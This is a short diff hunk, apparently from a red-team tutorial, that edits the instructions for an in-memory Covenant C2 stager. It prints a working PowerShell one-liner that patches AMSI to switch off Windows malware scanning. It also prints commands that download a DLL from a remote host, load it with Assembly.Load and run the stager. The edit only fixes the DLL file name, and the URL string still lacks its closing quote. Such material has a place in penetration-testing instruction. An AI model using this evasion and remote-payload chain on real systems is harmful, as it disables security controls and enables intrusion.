@@ -317,7 +317,7 @@ On the other hand we can keep our stager entirely in memory by downloading and e
 # Patch Amsi
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 
-PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234/covenant-DLL-noAmsi)
+PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234/covenant-DLL-noAmsi.dll)
 PS > [System.Reflection.Assembly]::Load($dll)
 PS > [MonkStager.MonkStager]::Execute()
 ```
